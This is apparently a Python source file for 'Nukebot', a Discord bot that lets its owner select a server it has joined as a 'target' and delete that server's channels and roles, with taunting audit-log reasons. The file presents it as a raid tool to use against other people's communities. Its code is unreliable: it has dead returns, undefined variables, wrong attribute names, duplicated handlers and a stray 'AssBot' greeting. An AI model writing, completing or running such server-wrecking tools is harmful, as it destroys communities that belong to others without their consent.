from os import getenv, execv
from subprocess import run
import platform
import asyncio
from sys import argv, executable
try:
    def dep_installer():
        from assets.install_deps import Dependencies
        Dependencies.install()
    known_opts = {"--install-dependencies":dep_installer}
    known_opts[argv[1]]()
except IndexError:
    pass
except KeyError:
    print(f"Unknown option for Nukebot: '{argv[1]}'")
    print(f"Ignoring and continuing to launch Nukebot.")

import json
def del_pair(key: str):
    with open("conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
    try:
        del data[key]
        with open("conf.json", "w+") as jsonfile:
            myJSON = json.dump(data, jsonfile, indent=2)
            jsonfile.close()
    except KeyError:
        return

def mod_config(key: str, value):
    with open("conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        
    data[key] = value
    with open("conf.json", "w+") as jsonfile:
        myJSON = json.dump(data, jsonfile, indent=2)
        jsonfile.close()

def get_var(key: str):
    with open("conf.json", "r") as jsonfile:
        data = json.load(jsonfile)
        jsonfile.close()
        try:
            val = data[key]
            return val
        except KeyError:
            return None

if get_var('Not Setup Yet!'):
    from assets.install_deps import Dependencies
    Dependencies.install()

import disnake
from disnake.ext import commands
from dotenv import load_dotenv
from os import getenv
from disnake.ext.commands import NotOwner,MemberNotFound,RoleNotFound,MessageNotFound,CommandInvokeError,MissingRequiredArgument,MissingPermissions,CommandOnCooldown,CommandNotFound,UserNotFound
from asyncio import TimeoutError
from time import mktime
from colorama import init, Fore
from datetime import datetime

init()

def logo():
    return disnake.File('assets/images/NukebotLogo.png')

class bolds:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

load_dotenv(".env")
token = getenv("token")
if token is None:
    token_from_input = input("Bot's token> ")
    f = open(".env", "w+")
    f.write(f"token={token_from_input}")
    f.close()
    load_dotenv(".env")

bot = commands.InteractionBot()

class select_home_guild(disnake.ui.Select):
    def __init__(self):
        Found_Guilds_Selects_Options = []
        for guild in bot.guilds:

            opts = disnake.SelectOption(label=guild.name,
                    value=str(guild.id),
                    description="Click to select this server")

            Found_Guilds_Selects_Options.append(opts)

        super().__init__(placeholder="Available servers", custom_id="select_home_server", options=Found_Guilds_Selects_Options)

class make_home_guild_select_view(disnake.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(select_home_guild())

class guildselects(disnake.ui.Select):
    def __init__(self):
        Found_Guilds_Selects_Options = []
        for guild in bot.guilds:

            opts = disnake.SelectOption(label=guild.name,
                    value=str(guild.id),
                    description="Click to select this server")

            Found_Guilds_Selects_Options.append(opts)

        super().__init__(placeholder="Available servers to nuke", custom_id="member_of_servers", options=Found_Guilds_Selects_Options)

class adddrop_ls_servers(disnake.ui.View):
    def __init__(self):
        super().__init__()
        self.add_item(guildselects())

class Config:
    role_del_audit = None
    channel_del_audit = None
    members_punish_audit = None
    target_server = None
    home_server = None

__target_serverid = get_var('target_server')
__home_serverid = [get_var('home_server')]
print(__home_serverid)
if str(__home_serverid) == '[None]':
    __home_serverid = [1, 2, 3]
print
class Functs:
    def guild_found():
        guild = bot.get_guild(__target_serverid)
        if guild is None:
            return False
        elif guild is not None:
            return guild

    def get_own_roles():
        guild = Functs.guild_found()
        if not guild:
            return None
        own_roles: list[disnake.Role] = []
        for role in guild.me.roles:
            own_roles.append(role)
        return own_roles

    def perms_for_role(roles: list[disnake.Role]):
        roles_and_their_perms = {}
        for role in roles:
            roles[str(role.id)] = role.permissions
        
        print(roles_and_their_perms)
        return roles_and_their_perms

optionss = commands.option_enum(
    ["Change text that will appear on audit logs for role deletions", 
    "Change text that will appear on audit logs for channel deletions",
    "Change text that will appear on audit logs for member punishments (ban, kick, etc)",
    "Change target server",
    "Change home server",
    ]
    )
@bot.slash_command(guild_ids=__home_serverid)
@commands.is_owner()
async def configure(i: disnake.ApplicationCommandInteraction, option: optionss = commands.Param(description="Choose an option to set / change")):
    """Configure Nukebot."""
    if str(option) == "Change text that will appear on audit logs for role deletions":
        await i.response.send_modal(
            modal=disnake.ui.Modal(
                title=f"Text on audit logs for role deletions", 
                components=[
                    disnake.ui.TextInput(
                        label="📜 text",
                        placeholder="Example: Your roles suck! or... Too many roles lol get it cleaned!",
                        custom_id="audit_rol_dels",style=disnake.TextInputStyle.paragraph,max_length=50
                        )
                    ],
                custom_id="modal_audit_rol_dels",
                timeout=600
            )
        )
        return
    if option == "Change text that will appear on audit logs for channel deletions":
        await i.response.send_modal(
            modal=disnake.ui.Modal(
                title=f"Text on audit logs for channel deletions", 
                components=[
                    disnake.ui.TextInput(
                        label="📜 text",
                        placeholder="Example: Your channels suck! or... Too many channels lol get it cleaned!",
                        custom_id="audit_chan_dels",style=disnake.TextInputStyle.paragraph,max_length=50
                        )
                    ],
                custom_id="modal_audit_chan_dels",
                timeout=600
            )
        )
        return
        results = mod_config('channel_del_audit', f"{msg.content}")
        if results == "set_key_in_default":
            await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {msg.content} ` will appear on their audit logs").set_thumbnail(file=logo()))
            return
    if option == "Change text that will appear on audit logs for member punishments (ban, kick, etc)":
        m = await i.send(content=f"> ✅ **Changing text that will appear on their audit logs for member nuke actions (i.e. ban, kick)**\nWhat shall be the text? *(Please type now)*")
        try:
            msg: disnake.Message = await bot.wait_for('message', check=lambda m: m.author.id == i.author.id and m.channel.id == i.channel.id, timeout=60)
        except TimeoutError:
            await i.send(embed=disnake.Embed(description=f"> ⏱️ Timed out. Retry.", color=disnake.Colour.red()).set_thumbnail(file=logo()))
            await m.edit(content=f"> ~~✅ **Changing text that will appear on their audit logs for member nuke actions**\nWhat shall be the text? *(TIMED OUT!)*~~")
            return
        results = mod_config('members_punish_audit', f"{msg.content}")
        if results == "set_key_in_default":
            await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {msg.content} ` will appear on their audit logs").set_thumbnail(file=logo()))
            return
    if option == "Change target server":
        m = await i.send(content=f"> ✅ **Specifying target server**", view=adddrop_ls_servers())
        return
    if option == "Change home server":
        await i.send(embed=disnake.Embed(title=f"Please specify your home/own server", color=0xF6F908, timestamp=datetime.now()).set_thumbnail(file=logo()), view=make_home_guild_select_view())
        return

@bot.slash_command(guild_ids=__home_serverid)
async def permissions_for(i: disnake.ApplicationCommandInteraction):
    """"""

@bot.slash_command(guild_ids=__home_serverid)
@commands.is_owner()
async def start(i: disnake.ApplicationCommandInteraction):
    guild_id = get_var('target_server')
    if guild_id is None:
        await i.send(embed=disnake.Embed(description=f"> Configure Nuke bot first with the ` /setup ` command", color=disnake.Colour.red()).set_thumbnail(file=logo()))
        return
    g = bot.get_guild(int(guild_id))
    if i.guild.id == g.id:
        await i.send(embed=disnake.Embed(description=f"> Are you insane? Do it in your own server remotely!", color=disnake.Colour.red()).set_thumbnail(file=logo()))
        return

    return

    for channel in g.channels:
        try:
            await channel.delete(reason=Config.channel_del_reason)
        except:
            pass

    for role in g.roles:
        try:
            await role.delete(reason=Config.role_del_reason)
        except:
            pass

@bot.message_command(name=f"Delete this message", dm_permission=True, guild_ids=[])
async def delete_message(i: disnake.ApplicationCommandInteraction):
    await i.data.target.delete()
    await i.response.defer()
    await i.send(content=f"** **")
    await i.delete_original_message()

@bot.event
async def on_ready():
    if len(bot.guilds) == 0:
        print(f"{bolds.RED}Hey! Hey!{bolds.END}{Fore.WHITE} Throw me at least in 1 server!")
        quit()
    if get_var('Not Setup Yet!'):
        dm_conv = await bot.owner.create_dm()
        await dm_conv.send(embed=disnake.Embed(title=f"💥 Welcome to Nukebot! ☢️ :D", description=f"To continue, please **specify the following**\n> **`Select your home server`**", color=0xF6F908, timestamp=datetime.now()).set_author(name=f"Hello, {bot.owner.display_name}").set_footer(text=f"It should NOT be the server you are targeting!!! Preferably your own server").set_thumbnail(file=logo()), view=make_home_guild_select_view())

    dm_conv = await bot.owner.create_dm()
    await dm_conv.send(
        embed=disnake.Embed(
            title=f"🍑 Welcome to AssBot 💦", 
            description=f"To continue, please **specify the following**\n> **`Select your home server`**", 
            color=0xF6F908, 
            timestamp=datetime.now())
            .set_author(name=f"Hello, {bot.owner.display_name}")
            .set_footer(text=f"It should NOT be the server you are targeting!!! Preferably your own server")
            .set_thumbnail(url=bot.user.display_avatar), view=make_home_guild_select_view()
        )
    def win_clear():
        """The windows version of command clear"""
        run("cls", shell=True)

    def lin_clear():
        """Clear, from Linux"""
        run(["clear"])

    doPlatformRespectiveCMD = {
        'Windows':win_clear,
        'Linux':lin_clear,
    }
    doPlatformRespectiveCMD[platform.system()]()

@bot.event
async def on_slash_command_error(i: disnake.ApplicationCommandInteraction, error):
    if isinstance(error, NotOwner):
        await i.send(embed=disnake.Embed(description=f">>> This bot should only be operated by it's owner, which is **{bot.owner}** or {bot.owner.mention}", color=disnake.Colour.red()).set_thumbnail(file=logo()))
        return
    raise error

@bot.event
async def on_modal_submit(i: disnake.ModalInteraction):
    value = i.data._components[0].children[0].value
    if i.data.custom_id == "modal_audit_rol_dels":
        mod_config('role_del_audit', value)
        await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {value} ` will appear on their audit logs").set_thumbnail(file=logo()))
        return
    if i.data.custom_id == "modal_audit_rol_dels":
        mod_config('role_del_audit', value)
        await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {value} ` will appear on their audit logs").set_thumbnail(file=logo()))
        return
    if i.data.custom_id == "modal_audit_rol_dels":
        mod_config('role_del_audit', value)
        await i.send(embed=disnake.Embed(title=f"✅ Gotcha", description=f"` {value} ` will appear on their audit logs").set_thumbnail(file=logo()))
        return

@bot.event
async def on_dropdown(i: disnake.MessageInteraction):
    """"""
    if i.data.custom_id == "member_of_servers":
        g = bot.get_guild(int(i.data.values[0]))
        if g is None:
            await i.response.send_message(embed=disnake.Embed(description=f">>> Could not find target server! :/\nHint: `Am I still in there?`", color=disnake.Colour.red()).set_thumbnail(file=logo()))
            return
        g_owner = await g.getch_member(g.owner_id)
        await i.response.edit_message(content=f"> ✅ **Updated your target server!**",
            embed=disnake.Embed(
                description=f"Updated your target server!", 
                color=disnake.Colour.green()).add_field(
                    name="Name", value=f"` {g.name} `", inline=False).add_field(
                    name="ID", value=f"` {g.id} `", inline=False).add_field(
                    name="Total members (including bots)", value=f"` {g.member_count} `", inline=False).add_field(
                    name="Created", value=f"<t:{int(mktime(g.created_at.timetuple()))}:R>", inline=False).add_field(
                    name="Description", value=f"` {g.description} `", inline=False).add_field(
                    name="Owner", value=f"` {g.owner_id} ` / ` {g_owner} ` / {g_owner.mention}", inline=False),
        components=disnake.ui.Select(placeholder=f"Updated your target server!", min_values=1, max_values=1, options=[disnake.SelectOption(label=f"disabled", value=f"Mark Rutte lol", description=f"Kan opkutte")], disabled=True))
        mod_config('target_server', int(i.data.values[0]))

    if i.data.custom_id == "select_home_server":
        g = bot.get_guild(int(i.data.values[0]))
        if g is None:
            await i.response.send_message(embed=disnake.Embed(description=f">>> Could not find target server! :/\nHint: `Am I still in there?`", color=disnake.Colour.red()).set_thumbnail(file=logo()))
            return
        await i.response.edit_message(embeds=[disnake.Embed(title=f"💥 Welcome to Nukebot! ☢️ :D", description=f"To continue, please **specify the following**\n> ` ✅ ` **You selected {g.name}**", color=0xF6F908, timestamp=datetime.now()).set_author(name=f"Hello, {bot.owner.display_name}").set_footer(text=f"It should NOT be the server you are targeting!!! Preferably your own server").set_thumbnail(file=logo()), disnake.Embed(title=f"Success!", description=f">>> {g.name} will now be the only server you are supposed to use commands on. Happy nuking! 💥", color=disnake.Color.green()).set_thumbnail(file=logo())], view=None)
        mod_config('home_server', g.id)
        del_pair('Not Setup Yet!')

try:    
    bot.run(token)
except KeyboardInterrupt:
    quit(0)